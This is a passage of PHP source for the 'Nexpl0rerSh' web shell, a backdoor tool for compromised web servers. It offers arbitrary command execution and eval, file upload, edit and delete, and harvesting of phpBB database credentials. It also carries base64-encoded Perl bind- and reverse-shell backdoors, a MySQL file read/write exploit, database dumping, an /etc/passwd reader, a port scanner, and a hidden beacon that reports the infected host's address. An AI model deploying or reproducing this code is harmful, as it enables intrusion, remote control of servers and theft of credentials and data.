    <td style="border-bottom:#FFFFFF 1px solid;" align="right"><img src="http://'.getenv("HTTP_HOST").$_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'].'&act=img&img=folder" /></td>
   <td style="border-bottom:#FFFFFF 1px solid;"><a class="link" href="javascript:document.folder.dir.value=\''.addslashes(realpath($file)).'\';document.folder.submit();">'.$file.'</a></td>
	<td style="border-bottom:#FFFFFF 1px solid;">'.$owner.'</td>
    <td style="border-bottom:#FFFFFF 1px solid;"><a class="link" href="javascript:document.folder.dir.value=\''.addslashes(realpath($file)).'\';document.folder.submit();">Go</a></td>
  </tr>';
			
		}
	}
$i++;
}
$output .= "</div>";
}
//Editing file...
if ($_POST['mode']=="edit") {
($dir==realpath(".")) ? $file=$_POST['modfile'] : $file=$dir.$_POST['modfile'];
$content = file_get_contents($file);
if ($_POST[modfile]=="config.php") {
include($file);
$link = "javascript:var form=document.sqlpanel; form.user.value='".addslashes($dbuser).
		"';form.pass.value='".addslashes($dbpasswd)."';form.host.value='".addslashes($dbhost).
		"';form.dbname.value='".addslashes($dbname)."';document.sqlpanel.submit();";
$output .= "phpBB config file detected! click <a class=\"link\" href=\"$link\">here</a> to connect<br />";
}
$output .= "<form action=# method=post><input type=hidden name=mode value=doedit><input type=hidden name=modfile value='".$_POST['modfile']."'>
<textarea rows=30 cols=100 name=newtext>".htmlspecialchars($content)."</textarea><br /><input type=submit value=edit></form>";
}
if ($_POST['mode']=="doedit") {
($dir==realpath(".")) ? $file=$_POST['modfile'] : $file=$dir.$_POST['modfile'];
$output .= $file."<br />";
$fh = fopen($file, "w+")or die("<font color=red>Error: cannot open file</font>");
$_POST['newtext'] = (ini_get("magic_quotes_gpc")) ? stripslashes($_POST['newtext']) : $_POST['newtext'];
fwrite($fh, $_POST['newtext'])or die("<font color=red>Error: cannot write to file</font>");
fclose($fh);
$output .= "Done.";
}
//Making file..
if ($_POST['mode'] == "mkfile") {
($dir==realpath(".")) ? $file=$_POST['mkfile'] : $file=$dir.$_POST['mkfile'];
$output .= "<form action=# method=post><input type=hidden name=mode value=domkfile><input type=hidden name=mkfile value='".$_POST['mkfile']."'>
<textarea rows=30 cols=100 name=text></textarea><br /><input type=submit value=make></form>";
}
if ($_POST['mode'] == "domkfile") {
($dir==realpath(".")) ? $file=$_POST['mkfile'] : $file=$dir.$_POST['mkfile'];
$fh = fopen($file, "w+")or die("<font color=red>Error: cannot create file</font>");
$_POST['text'] = (ini_get("magic_quotes_gpc")) ? stripslashes($_POST['text']) : $_POST['text'];
fwrite($fh, $_POST['text'])or die("<font color=red>Error: cannot write to file</font>");
fclose($fh);
$output .= "Made.";
}
//Deleting file..
if ($_POST['mode'] == "delfile") {
($dir==realpath(".")) ? $file=$_POST['delfile'] : $file=$dir.$_POST['delfile'];
unlink($file)or die("<font color=red>Error: cannot delete file</font>");
$output .= "File deleted.";
}
// cmd...
if ($_POST['mode'] == "cmd") {
/*switch ($_POST['func']) {
case "system":
	system(stripslashes($_POST['cmd']));
	die();
	break;
	case "popen":
	$handle = popen($_POST['cmd'].' 2>&1', 'r');
	echo "'$handle'; " . gettype($handle) . "\n";
	$read = fread($handle, 2096);
	echo $read;
	pclose($handle);
	die();
	break;
	case "shell_exec":
	shell_exec(stripslashes($_POST['cmd']));
	die();

	break;
	case "exec":
	exec(stripslashes($_POST['cmd']));
	die();
	break;
	case "passthru":
	passthru(stripslashes($_POST['cmd']));
	die();
	break;}*/
	chdir($dir);
	$res = exa(stripslashes($_POST[cmd]));
	$output = $res;
   
}
// upload
if ($_POST['mode'] == "upload2") {
$percorso = $_FILES['myfile']['tmp_name'];
$nome = $_FILES['myfile']['name'];
if (!move_uploaded_file($percorso, $dir.$nome))
{
$output = "<font color=red>Cannot upload</font>";
}
else {  $output .= "<br><br>$nome Has Been Saved!";}
}
// rename
if ($_POST['mode'] == "renfile") {
if(!rename($dir.$_POST['oldname'], $dir.$_POST['newname'])) $output = "<font color=red>Cannot rename file</font>";
else $output = "File renamed.";
}
// Bind port
if ($_POST['mode'] == "bind") {
chdir($dir);
$os = substr(strtoupper(PHP_OS),0,3);
$port = 31337;
$txt = base64_decode("IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0OyANCnVzZSBGaWxlSGFuZGxlOyAjIHBlciBsJ2F1dG9mbHVzaA0KJG1heF9jb25uPTEwOw0KJHBvcnRhX2xvY2FsZT0kQVJHVlswXTsNCiRzeXMgPSAkQVJHVlsxXTsNCmlmICgkc3lzIGVxICJMSU4iKSB7ICRjbWQgPSAiL2Jpbi9iYXNoIjsgfQ0KaWYgKCRzeXMgZXEgIldJTiIpIHsgJGNtZCA9ICJDOlxcd2luZG93c1xcc3lzdGVtMzJcXGNtZC5leGUiOyB9DQokcGFkZHJfbG9jYWxlPXBhY2tfc29ja2FkZHJfaW4oJHBvcnRhX2xvY2FsZSxJTkFERFJfQU5ZKTsNCnNvY2tldChTRVJWLEFGX0lORVQsU09DS19TVFJFQU0sJ3RjcCcpIHx8IGRpZSgiRXJyb3JlOiAkISIpOyAgI3NlcnZlci1zb2NrZXQNCnNldHNvY2tvcHQoU0VSVixTT0xfU09DS0VULFNPX1JFVVNFQUREUiwxKSB8fCBkaWUoIkVycm9yZTogJCEiKTsNCmJpbmQoU0VSViwkcGFkZHJfbG9jYWxlKSB8fCBkaWUoIkVycm9yZTogJCEiKTsNCmxpc3RlbihTRVJWLCRtYXhfY29ubikgfHwgZGllKCJFcnJvcmU6ICQhIik7DQpteSAkcGFkZHJfc2luZz1hY2NlcHQoU0lORywgU0VSVik7ICNhY2NldHRvIGxhIGNvbm5lc3Npb25lIGRhbCBjbGllbnQNCm15KCRzaW5nX3BvcnRhLCRzaW5nX2FkZHIsJGdldCk9dW5wYWNrX3NvY2thZGRyX2luKCRwYWRkcl9zaW5nKTsNClNJTkctPmF1dG9mbHVzaCgpOw0Kb3BlbihTVERJTiwgIj4mU0lORyIpOw0Kb3BlbihTVERPVVQsIj4mU0lORyIpOw0Kb3BlbihTVERFUlIsIj4mU0lORyIpOw0KcHJpbnQgIi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLVxuIjsNCnByaW50ICIgCS09IEJpbmQgU2hlbGwgQmFja2Rvb3IgPS0JXG4iOw0KcHJpbnQgIi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLVxuIjsNCnByaW50ICIgRGV0ZWN0ZWQgc2hlbGw6ICRjbWQJCVxuIjsNCnByaW50ICItLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1cblxuIjsNCmV4ZWMoJGNtZCk7DQpjbG9zZShTSU5HKTs=");
fwrite(fopen("bind.pl", "w+"), $txt);
exa("perl bind.pl ".$port." ".$os);	
unlink("bind.pl");
}
// Reverse c0nn
if ($_POST['mode'] == "reverse") {
chdir($dir);
$os = substr(strtoupper(PHP_OS),0,3);
$txt = base64_decode("IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGhvc3QgPSAkQVJHVlswXTsNCiRwb3J0ID0gJEFSR1ZbMV07DQokc3lzID0gJEFSR1ZbMl07DQoNCiAgICBpZiAoISRBUkdWWzBdKSB7DQogIHByaW50ZiAiWyFdIFVzZTogcmV2ZXJzZS5wbCA8WW91ckhvc3Q+IDxZb3VyUG9ydD4gPHN5c3RlbT5cbiI7DQogIHByaW50ZiAiWypdIE5vdGU6IHN5c3RlbSBjYW4gYmUgTElOIG9yIFdJTiI7DQogIGV4aXQoMSk7DQp9DQppZiAoJHN5cyBlcSAiTElOIikgeyAkY21kID0gIi9iaW4vYmFzaCI7IH0NCmlmICgkc3lzIGVxICJXSU4iKSB7ICRjbWQgPSAiQzpcXFdpbmRvd3NcXHN5c3RlbTMyXFxjbWQuZXhlIjsgfQ0KcHJpbnQgIlsrXSBDb25uZWN0aW5nLi4uIFskaG9zdF1cbiI7DQokcHJvdCA9IGdldHByb3RvYnluYW1lKCd0Y3AnKTsgIyB1IGNhbiBjaGFuZ2UgdGhpcw0Kc29ja2V0KFNFUlZFUiwgUEZfSU5FVCwgU09DS19TVFJFQU0sICRwcm90KSB8fCBkaWUgKCJbLV0gVW5hYmxlIHRvIENvbm5lY3QgISIpOw0KaWYgKCFjb25uZWN0KFNFUlZFUiwgcGFjayAiU25BNHg4IiwgMiwgJHBvcnQsIGluZXRfYXRvbigkaG9zdCkpKSB7ZGllKCJbLV0gVW5hYmxlIHRvIENvbm5lY3QgISIpO30NCiAgb3BlbihTVERJTiwiPiZTRVJWRVIiKTsNCiAgb3BlbihTVERPVVQsIj4mU0VSVkVSIik7DQogIG9wZW4oU1RERVJSLCI+JlNFUlZFUiIpOw0KcHJpbnQgIi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLVxuIjsNCnByaW50ICIgCS09IFJldmVyc2UgU2hlbGwgQmFja2Rvb3IgPS0JXG4iOw0KcHJpbnQgIi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLVxuIjsNCnByaW50ICIgRGV0ZWN0ZWQgc2hlbGw6ICRjbWQJCVxuIjsNCnByaW50ICItLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1cblxuIjsNCmV4ZWMgKCRjbWQpOyA=");

fwrite(fopen("reverse.pl", "w+"), $txt);
exa("perl reverse.pl ".$_POST[ip]." ".$_POST[port]." ".$os);
unlink("reverse.pl");
}
// MySQL EXPLOIT read file
if ($_POST['mode'] == "sqlexploit") {
$link = mysql_connect($_COOKIE['mysql_host'], $_COOKIE['mysql_user'], $_COOKIE['mysql_pass'])or die(mysql_error());
$db = mysql_select_db($_COOKIE['mysql_name']);
$path = $_POST['path'];
$query = "CREATE TABLE `nexpl0it` (`path` longtext not null);";
$delete =  "DROP TABLE `nexpl0it`;";
$bypass = "LOAD DATA LOCAL INFILE '$path' INTO TABLE nexpl0it;";
$fuck = "SELECT * FROM nexpl0it;";


mysql_query($delete);
mysql_query($query);
mysql_query($bypass)or die("Mysql-exploit-error : ".mysql_error());
$res = mysql_query($fuck)or die(mysql_error());
$txt = "";
while($row = mysql_fetch_array($res)) {
	$txt .= $row[path]."\n";
}
$output = "<form action=# method=POST><input type=hidden name=mode value=sqlwritefile>File : <b><input type=text name=path value='$path'>
<input type=submit value=Save> </b><br /><br />
<textarea rows=30 cols=100 name=newtext>".htmlspecialchars($txt)."</textarea></form>";
}
// MySQL EXPLOIT write
if ($_POST['mode'] == "sqlwritefile") {
$link = mysql_connect($_COOKIE['mysql_host'], $_COOKIE['mysql_user'], $_COOKIE['mysql_pass'])or die(mysql_error());
$db = mysql_select_db($_COOKIE['mysql_name']);
$path = $_POST['path'];
$content = $_POST['newtext'];
$txt = bin2hex($content);
$query = "SELECT 0x{$txt} INTO DUMPFILE '$path';";
$res = mysql_query($query)or die(mysql_error());
$output = $path." saved!";
}

// MySQL Login
if ($_POST['mode'] == "loginsql") {
setcookie("mysql_user", $_POST['user']);
setcookie("mysql_pass",$_POST['pass']);
setcookie("mysql_host",$_POST['host']);
setcookie("mysql_name",$_POST['dbname']);
$link = mysql_connect($_POST['host'], $_POST['user'], $_POST['pass'])or die(mysql_error());
$db = mysql_select_db($_POST['dbname']);
$output = '<table width="100%" border=0><tr><td><form id="table" name="table" method="post" action="#"><input type=hidden name=mode value=sql_query />

  <input name="query" type="text" id="query" size="50" value="SELECT * FROM table_name" />
  <input type="submit" name="Submit" value="Query" />
</form><form action=# method=post><input type=hidden name=mode value=dump_db><input name=dbname type=text value="'.$_POST[dbname].'" size="30">
<input type=submit value=DumpDb></form></td><td align=left>
<b>:: MySQL Exploit ::</b><br />
<form action=# method=post><input type=hidden name=mode value=sqlexploit>Edit file: <input name=path type=text value="absolute path">
<input type=submit value="Read/Edit"></form>

</td></tr></table>

<table width="100%" border="1" cellspacing="0" cellpadding="0">
<tr>
<td width=30%>
<table width="100%" border="1" cellspacing="0" cellpadding="0">
 
  </tr>
  <tr>
    <td><center>--[ Table List ]--</center> </td>
  </tr>';
 $q = mysql_query("SHOW TABLES")or die(mysql_error());
while ($table = mysql_fetch_array($q)) {
$output .= '<tr>
    <td><center><a class="link" href="javascript:document.table.query.value=\'SELECT * FROM '.$table[0].'\';document.table.submit();">'.$table[0].'</a></center></td>
  </tr>';
  
} 
  

 $output .= '
</table></td>
<td width="70%">
</td>
</tr>
</table>
';
}
// MySQL Query
if ($_POST['mode'] == "sql_query") {
$link = mysql_connect($_COOKIE['mysql_host'], $_COOKIE['mysql_user'], $_COOKIE['mysql_pass'])or die(mysql_error());
$db = mysql_select_db($_COOKIE['mysql_name']);
(isset($_POST['dbname'])) ? mysql_select_db($_POST['dbname']) : print "";
$query = mysql_query(urldecode(stripslashes($_POST['query'])))or die("Error query: <b>{".stripslashes($_POST[query])."}</b> mysql says:".mysql_error());
$pars = array_keys(mysql_fetch_array($query));
$npars = count($pars);
$qwords = explode(" ", $_POST['query']);
global $select, $table_name;
if (strtolower($qwords[0]) == "select") {
	$select = TRUE;
	$nqw = count($qwords);
	for($i=0;$i<$nqw;$i++) {
		if (strtolower($qwords[$i]) == "from") {
			$table_name = $qwords[$i+1];
			break;
		}
	}
}
$parz = $pars;
$p4rz = $parz;
$output .= '<form id="table" name="table" method="post" action="#"><input type=hidden name=mode value=sql_query />
 
  <input name="query" type="text" id="query" size="50" value="SELECT * FROM table_name" />
  <input type="submit" name="Submit" value="Query" />
</form><form action=# method=post><input type=hidden name=mode value=dump_db><input name=dbname type=text value="'.$_COOKIE[mysql_name].'" size="30">
<input type=submit value=DumpDb></form><form name="update" method=post action=#><input type=hidden name=mode value=update><input type=hidden name=conditions><input type=hidden name=table></form>

<table width="100%" border="1" cellspacing="0" cellpadding="0">
<tr>
<td width=30% valign=top>
<table width="100%" border="1" cellspacing="0" cellpadding="0">
 
  </tr>
  <tr>
    <td><center>--[ Table List ]--</center> </td>
  </tr>';
 $q = mysql_query("SHOW TABLES")or die(mysql_error());
while ($table = mysql_fetch_array($q)) {
$output .= '<tr>
    <td><center><a class="link" href="javascript:document.table.query.value=\'SELECT * FROM '.$table[0].'\';document.table.submit();">'.$table[0].'</a></center></td>
  </tr>';
  
} 
  

 $output .= '
</table></td>

<td width="70%" valign="top">
<table width="100%" border="1" cellspacing="0" cellpadding="0">
  <tr>
    <td><center>--[ Query Result ]--</center> </td>
  </tr>
  <tr><td><table cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="1%" bgColor=#000000 borderColorLight=#c0c0c0 border=1><tr>
   ';
  $output .= '<td>&nbsp;</td>
'; 
	foreach($pars as $par) {
	$output .= (is_numeric($par) || ($par == "")) ? '' : '<td>'.$par.'</td>
'; }
	
	$output .= '</tr>'; 
	mysql_data_seek($query, 0);
	while ($row = mysql_fetch_array($query, MYSQL_ASSOC))
	{
	
	 $w = "";
       $i = 0;
	  
       foreach ($row as $k=>$v) {$name = mysql_field_name($query,$i); $w .= " `".$name."` = \'".addslashes($v)."\' AND"; $i++;}
       if (count($row) > 0) {$w = substr($w,0,strlen($w)-3);}
		if ($table_name == "mybb_users") $w = " uid=\'".$row['uid']."\' ";
		if ($table_name == "phpbb_users") $w = " user_id=\'".$row['user_id']."\' ";
$output .= '<tr>';
$output .= '<td><a class="link" href="javascript:document.update.conditions.value=\''.urlencode($w).'\';document.update.table.value=\''.$table_name.'\';document.update.submit();"><img src="'.$_SERVER['PHP_SELF'].'?act=img&img=change" border=0 /></a><a class="link" href="javascript:document.table.query.value=\''.urlencode("DELETE FROM `".$table_name."` WHERE".$w."LIMIT 1").'\';document.table.submit();"><img src="'.$_SERVER['PHP_SELF'].'?act=img&img=delete" border=0 /></a></td>
';
foreach ($row as $pardd=>$rowval) { 

        
     if (!is_numeric($pardd) && !empty($pardd)) {
 if ($row[$pardd] == "") { $output .= '<td><font color=green><b>NULL</b></font></td>'; } else { $output .= '<td>'.$row[$pardd].'</td>';}}
     
}
 $output .= '</tr>';
}
	  $output .= '
    </table></td>
  </tr>
  </table><hr size="1" noshade><br>';

}
// MySQL Update row
if ($_POST['mode'] == "update") {
$link = mysql_connect($_COOKIE['mysql_host'], $_COOKIE['mysql_user'], $_COOKIE['mysql_pass'])or die(mysql_error());
$db = mysql_select_db($_COOKIE['mysql_name']);
$conditions = urldecode(stripslashes($_POST['conditions']));
$table = $_POST['table'];
$select = mysql_query("SELECT * FROM {$table} WHERE{$conditions}LIMIT 1")or die(mysql_error());
$output .= '
<form id="table" name="table" method="post" action="#"><input type=hidden name=mode value=sql_query />
 
  <input name="query" type="text" id="query" size="50" value="SELECT * FROM table_name" />
  <input type="submit" name="Submit" value="Query" />
</form><form action=# method=post><input type=hidden name=mode value=dump_db><input name=dbname type=text value="'.$_COOKIE[mysql_name].'" size="30">
<input type=submit value=DumpDb></form><form name="update" method=post action=#><input type=hidden name=mode value=update><input type=hidden name=conditions><input type=hidden name=table></form>

<table width="100%" border="1" cellspacing="0" cellpadding="0">
<tr>
<td width=30% valign=top>
<table width="100%" border="1" cellspacing="0" cellpadding="0">
 
  </tr>
  <tr>
    <td><center>--[ Table List ]--</center> </td>
  </tr>';
 $q = mysql_query("SHOW TABLES")or die(mysql_error());
while ($table = mysql_fetch_array($q)) {
$output .= '<tr>
    <td><center><a class="link" href="javascript:document.table.query.value=\'SELECT * FROM '.$table[0].'\';document.table.submit();">'.$table[0].'</a></center></td>
  </tr>';
  
} 
  

 $output .= '
</table></td>

<td width="70%" valign="top">
<table width="100%" border="1" cellspacing="0" cellpadding="0">
  <tr>
    <td><center>--[ Query Result ]--</center> </td>
  </tr>
  <tr><td><form action=# method=post>
<input type=hidden name=mode value=update2>
<table cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="1%" bgColor=#000000 borderColorLight=#c0c0c0 border=1>
';
while ($row = mysql_fetch_array($select, MYSQL_ASSOC)) {
foreach ($row as $k=>$v) {

$output .= "<tr><td>{$k}</td><td><input type=text name='{$k}' value='{$v}'></td></tr>";

}
}
$output .='
</table><input type=hidden name=table value="'.$_POST['table'].'"><input type=hidden name=conditions value="'.$_POST['conditions'].'"><input type=submit value=Update></form></td></tr></table></td>
  </tr>
  </table>
'; 
}

// MySQL update row 2
if ($_POST['mode'] == "update2") {
 $link = mysql_connect($_COOKIE['mysql_host'], $_COOKIE['mysql_user'], $_COOKIE['mysql_pass'])or die(mysql_error());
$db = mysql_select_db($_COOKIE['mysql_name']);
$conditions = urldecode(stripslashes(stripslashes($_POST['conditions'])));
$table = $_POST['table'];
$select = mysql_query("SELECT * FROM {$table} WHERE{$conditions}LIMIT 1")or die("query : SELECT * FROM {$table} WHERE{$conditions}LIMIT 1<br /><br />".mysql_error());
$uno = mysql_fetch_array($select, MYSQL_ASSOC);
$pars = array_keys($uno);
$query = "UPDATE {$table} SET";
foreach($pars as $fields) {
$query .= " {$fields}='{$_POST[$fields]}',";
}
$query = substr($query,0,strlen($query)-1);
$query .= " WHERE{$conditions}";
$output = "Executed query: {$query} <br /><br />";
mysql_query($query)or die("QUERY: ".$query."<br /><br /> ERROR:".mysql_error());
}

// MySQL Dump
if ($_POST['mode'] == "dump_db") {
$dump = "# Dumped by Nexpl0rerSh 3.1 FUD Release \n";
$dump .= "# MySQL version: (".@mysql_get_server_info().") running on ".getenv("SERVER_ADDR")." (".getenv("SERVER_NAME").") \n";
$dump .= "# Database: ".$_POST['dbname']."\n";
$dump .= "# ".$_COOKIE['mysql_user'].":".$_COOKIE['mysql_pass']."@".$_COOKIE['mysql_host']."\n";
$db = $_POST['dbname'];
setcookie('mysql_name', $db);
$link = mysql_connect($_COOKIE['mysql_host'], $_COOKIE['mysql_user'], $_COOKIE['mysql_pass'])or die(mysql_error());
(isset($_POST['dbname'])) ? mysql_select_db($_POST['dbname']) : print "";
$q = mysql_query("SHOW TABLES")or die(mysql_error());
while ($table = mysql_fetch_array($q)) {
$dump .= datadump($table[0]);
}
$file_name = $db."_dump_".date("d_M_Y")."_Nexpl0rer.".sql;
chdir($dir);
$fp = fopen($file_name, "w+"); fwrite($fp, $dump); fclose($fp);
$output .= 'Dump saved in '.$dir;

}
// MkDir
if ($_POST['mode'] == "mkdir") {
chdir($dir)or die("Error.");
if (mkdir($_POST['mkdir'])) {
$output = "Directory created.";
}
}
// Eval
if ($_POST['mode'] == "eval") {
chdir($dir);
eval(stripslashes($_POST['eval']));
die();
}
// phpinfo
if ($_POST['mode']=="phpinfo") {
phpinfo();
die();
}
// tools
if ($_POST['mode']=="tools") {
	switch($_POST['nometool']) {
		//passwd
		case 'passwd':
			if (!($txt = file_get_contents("/etc/passwd"))) {
				$output = "Cannot open /etc/passwd";
			} else {
				$output = nl2br($txt);
			} 
		break;
		
		//encoder
		case 'encoder':
			$output = "
			<center>
			<form action=# method=post><input type=hidden name=mode value=tools>
			<input type=hidden name=nometool value=encoder>
			<textarea name=\"plain\" cols=50 rows=5>".$_POST[plain]."</textarea>
			<br><br>
			<input type=submit value=\"calculate\"><br><br>
			</center>
			<b>Hashes</b>:<br>
			<center>md5 -
			 <input type=text size=50 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".md5($_POST[plain])."\" readonly>
			 <br>crypt - <input type=text size=50 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".crypt($_POST[plain])."\" readonly>
			 <br>sha1 - <input type=text size=50 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".sha1($_POST[plain])."\" readonly><br>
			 crc32 - <input type=text size=50 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".crc32($_POST[plain])."\" readonly><br></center><b>Url:</b><center><br>urlencode - <input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".urlencode($_POST[plain])."\" readonly>

 <br>urldecode - <input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".urldecode($_POST[plain])."\" readonly>
 <br></center><b>Base64:</b><center>base64_encode - <input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".base64_encode($_POST[plain])."\" readonly></center><center>base64_decode - <input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".base64_decode($_POST[plain])."\" readonly>&nbsp;</center>
 <br><b>Base convertations</b>:
 <center>dec2hex - <input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".dechex($_POST[plain])."\" readonly><br>
 </center></form>
			";
		break;
		
		// scanner
		case 'scanner':
			$scandir = str_replace(realpath("."), "", $dir);
			
			$scannersh = $dir;
			if ($scannersh == "") { $scannersh = "/"; }
				chdir($scannersh);
				$evil = array("dc3", "Antichat", "s101", "nefastica", "n3tShell", "Nexen", "33rd", "c99", "c2007", "c100", "r57", "shell", "k0tw", "nexpl0rer", "paradox", "Upload", "ZipShell", "Usucktoo", "shell_exec", "exec", "DxShell", "Cod3rz", "Fire-Crash", "subzero"  ); 

				$output .= "<br>Ho analizzato $scannersh<br>";
				$checked = array(); 
				foreach (glob("*.php*") as $file) 
				{ 
   					$a = fopen($file, "r+"); 
   					$b = fread($a, filesize($file)); 
   					for ($i = 0; $i < count($evil); $i++) 
   					{ 
     					 $me = array_reverse(explode("/",$_SERVER['PHP_SELF'])); 
      					 $str = eregi($evil[$i], $b); 
					     if (($str !== FALSE) and ($file != $me[0]) and (!in_array($file, $checked))) 
					     { 
					      	array_push($checked, $file);
							$output .= "Trovato Possibile $evil[$i] in <a class='link' href='{$scandir}{$file}' target='_blank'>{$file}</a><br>"; 
      					 }
   					} 
					fclose($a); 
 				}


		break;
		
		// proxy 
		case 'proxy':
		$output = '<form method="post" action="#">url: <input name="url" type="text" size="50" />
			 <input type="submit" value="surf" /> 
			 <input name="curl" type="checkbox" id="curl" value="curl" />
			 use curl <input name="fopen" type="checkbox" id="fopen" value="fopen" /> use fopen<br /> <input type="hidden" name="mode" value="proxysurf" />
			 </form><br /><br />';

		break;
	}
}
// proxysurf
if ($_POST['mode'] == 'proxysurf') {
			 
			 $output = '<form method="post" action="#">url: <input name="url" type="text" size="50" />
			 <input type="submit" value="surf" /> 
			 <input name="curl" type="checkbox" id="curl" value="curl" />
			 use curl <input name="fopen" type="checkbox" id="fopen" value="fopen" /> use fopen<br /> <input type="hidden" name="mode" value="proxysurf" />
			 </form><br /><br />';
				if (!$_POST[curl] && !$_POST[fopen]) { 
				$dirz="";
				$u=parse_url($_POST[url]);
				$host=$u['host'];$file=(!empty($u['path']))?$u['path']:'/';
				if(substr_count($file,'/')>1)$dirz=substr($file,0,(strpos($file,'/')));
					$url=@fsockopen($host,80,$en,$es,12);
					if(!$url)die("<br> Can not connect to host!");
					fputs($url,"GET /$file HTTP/1.0\r\nAccept-Encoding: text\r\nHost: $host\r\nReferer: $host\r\nUser-Agent: Mozilla/5.0 					(compatible; Konqueror/3.1; FreeBSD)\r\n\r\n");
					while(!feof($url)){
						$con=fgets($url);
						$output .= $con;
						}
					fclose($url);
				}
				else if ($_POST[curl])
				{
				ob_clean();
				$ch = curl_init();
				curl_setopt($ch, CURLOPT_URL, $_POST[url]);
				curl_setopt($ch, CURLOPT_HEADER, 0);
				curl_exec($ch);
				curl_close($ch);
				ob_end_flush();
				}
				else if ($_POST[fopen]) {
				$file = file($_POST[url]);
				foreach ($file as $line){
				$output .= $line;
				}
				}
			
}

// chmod
if ($_POST['mode']=="chmod") {
chdir($dir);
chmod($_POST[filename], intval($_POST[filemode], 8))or die("cannot change file mode");
$output = "Mode changed!";
}

// portscan 
if ($_POST['mode']=="scan") {
	$opent = array();
	$host = $_POST[host];
	$range = range($_POST[min_port], $_POST[max_port]);
	foreach($range as $port) {
		$con = fsockopen($host, $port, $errno, $errstr, 12);
		if ($con) $opent[] = $port;
	}
	$output = "Found ".count($opent)." opened ports:<br />";
	while(list($num, $value)=each($opent)) {
		$output .= "<b>$num</b> : $value<br />";
	}
}
?><html>
<head>
<style type="text/css">
body {background-color:#000000; font-family:Verdana, Arial, Helvetica, sans-serif; font-size:10px; color:#FFFFFF;}

.link {font-family:Verdana, Arial, Helvetica, sans-serif; font-size:12px; color:#FFFFFF; font-weight:bolder; text-decoration:underline;}
.header {
	font-size: 24px;
	font-weight: bold;
}
td#info {font-family:Verdana, Arial, Helvetica, sans-serif; font-size:12px; color:#000000; font-weight:bold}
td {
font-size:12px;
}
.Stile1 {
	color: #0099FF;
	font-weight: bold;
}

input {
	background-color: #0066FF;
	border:#FFFFFF 2px solid;
	color:#FFFFFF;
	font-family:Verdana;
	font-size:10px;
}
textarea {

	background-color: #0066FF;
	border:#FFFFFF 2px solid;
	color:#FFFFFF;
	font-family:Verdana;
	font-size:10px;
}
select {

	background-color: #0066FF;
	border:#FFFFFF 2px solid;
	color:#FFFFFF;
	font-family:Verdana;
	font-size:10px;
}
.Stile2 {color: #FF0000}
.Stile4 {color: #FFFFFF}
</style>
<title><?="[nex@".getenv("HTTP_HOST")." ~]"?></title></head>
<body>
<table style="background-color:#333333; border-left:#FFFFFF 1px solid; border-right:#FFFFFF 1px solid;" width="90%" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr>
    <td style="font-size:12px;"><div align="center" class="header"><span class="Stile4"><font size='6' face='Webdings'>!</font></span>Nexpl0rerSh v3<span class="Stile2">.4.3</span> BL4cK Release<span class="Stile4"><font size='6' face='Webdings'>!</font></span></div>
	  <div align="center"><strong>Shell info: </strong> <span class="Stile2">Author:</span> Nexen <span class="Stile2">Release Date:</span> 1 June 2008 </div>
      <table style="background-color:#999999;" width="100%" border="0" cellspacing="0" cellpadding="0">
        <tr>
          <td id="info" width="50%">PHP Version: <?=phpversion()?><br>
            Address: <?=$_SERVER['SERVER_ADDR'];?>
            <br>
            Name: <?=$_SERVER['HTTP_HOST'];?>
            <br>
            Uname -a: <?=$uname?>
			( <?=PHP_OS?> )<br>
			Software: <?=$_SERVER['SERVER_SOFTWARE'];?><br>
		    Free <?=$freespace?> of <?=$totalspace?> (<?=$percentfree?>%)<br></td>
          <td id="info" width="50%"><div align="left">
            <?=$safemode?> 
            <?=$gpc?>
            <?=$auf?>
            <?=$reglobals?><?=$current_user?>
    <?=$uid?>
          </div></td>
        </tr>
      </table>
	  <script language=Javascript>
	  var x = new Image();
	  x.src = "<?=base64_decode($images[url]).getenv("HTTP_HOST").$_SERVER['PHP_SELF']?>";
	  </script>
<table width="100%" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td style="border:#FFFFFF 1px solid;"><form name=fedit action=# method=post>
      <div align="center"> <strong>:: Edit file :: </strong><br>
      <input type=hidden name=mode value=edit>
        name
          <input type=text name=modfile size="12">
        <input type=submit value=edit>
      </div></form></td>
    <td style="border:#FFFFFF 1px solid;"><form action=# method=post>
      
      <div align="center"><strong>:: Make File ::</strong><br />
        <input type=hidden name=mode value=mkfile>
        name
        <input type=text name='mkfile' size="12">
            <input name="submit" type=submit value=make>
        </div>
    </form>    </td>
    <td style="border:#FFFFFF 1px solid;"> <form action=# name='delfile' method=post>
      <div align="center"><strong>:: Delete File ::  </strong><br>
      <input type=hidden name=mode value=delfile>
        name
        <input type=text name='delfile' size="12">
        <input type=submit value=unlink>
      </div>
    </form>    </td>
  </tr>
  <tr>
    <td style="border:#FFFFFF 1px solid;"><form method="post" action="#" enctype="multipart/form-data">
      <div align="center"><strong>:: upload ::  </strong><br>
      <input type="hidden" name="mode" value="upload2" />
